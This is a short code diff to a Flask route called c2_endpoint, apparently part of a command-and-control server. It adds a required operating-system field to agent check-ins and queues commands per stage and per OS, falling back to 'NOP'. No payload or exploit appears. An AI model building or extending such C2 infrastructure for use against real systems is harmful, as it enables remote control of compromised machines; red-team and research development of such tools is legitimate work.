@@ -176,26 +176,25 @@ def c2_endpoint():
     """
     try:
         data = request.get_json(force=True)
+
         stg = data.get("stg")
+        ops = data.get('ops')
+
         if not stg:
             logging.warning("Received invalid stage command")
             return jsonify({"error": "Missing agent ID"}), 400
+        
+        if not ops:
+            logging.warning("Received invalid os identification command")
+            return jsonify({"error": "Mssing operating system identification"}), 400
 
         # Record the check-in time for metrics.
         checkin_time = time.time()
         agent_metrics.setdefault((stg), {})['last_checkin'] = checkin_time
         logging.info(f"Agent at stage={stg} checked in at {checkin_time:.2f}")
 
-        # Get the next command from the agent's command queue.
-        # if recon_commands.get(agent_id) and len(recon_commands[agent_id]) > 0:
-        #     command_data = recon_commands[agent_id].pop(0)
-        #     command_text = command_data.get("cmd")
-        # else:
-        #     # Default command if no pending commands.
-        #     command_text = "NOP"
-
-        if(order.get(stg) and len(order[stg]) > 0):
-            command_data = order[stg].pop(0)
+        if(order.get(stg) and len(order[stg][ops]) > 0):
+            command_data = order[stg][ops].pop(0)
             command_text = command_data.get("cmd")
         else:
             command_text = "NOP"
